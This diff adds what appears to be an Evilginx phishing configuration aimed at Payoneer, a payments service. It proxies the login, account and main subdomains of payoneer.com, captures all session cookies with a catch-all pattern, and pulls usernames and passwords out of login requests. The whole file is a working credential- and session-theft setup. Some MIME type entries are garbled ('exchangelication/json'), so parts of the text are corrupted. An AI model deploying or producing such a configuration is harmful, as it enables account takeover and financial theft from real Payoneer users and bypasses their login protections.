@@ -1,0 +1,28 @@
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'payoneer.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'payoneer.com', session: true, is_landing: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'payoneer.com', session: true, is_landing: true}
+  - {phish_sub: 'pubs', orig_sub: 'pubs', domain: 'payoneer.com'}
+sub_filters:
+  - {triggers_on: 'myaccount.payoneer.com', orig_sub: 'myaccount', domain: 'payoneer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'exchangelication/json', 'exchangelication/javascript', 'exchangelication/x-javascript']}
+  - {triggers_on: 'www.payoneer.com', orig_sub: 'www', domain: 'payoneer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'exchangelication/json', 'exchangelication/javascript', 'exchangelication/x-javascript']}
+  - {triggers_on: 'login.payoneer.com', orig_sub: 'login', domain: 'payoneer.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'exchangelication/json', 'exchangelication/javascript', 'exchangelication/x-javascript']}
+auth_tokens:
+  - domain: '.*.payoneer.com'
+    keys: ['.*,regexp']
+auth_urls:
+  - '/gw-auth/.*'
+  - '/MainPage/.*'
+credentials:
+  username:
+    key: ''
+    search: '"Username":"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"Password":"([^"]*)'
+    type: 'json'
+login:
+  domain: 'myaccount.payoneer.com'
+  path: '/'
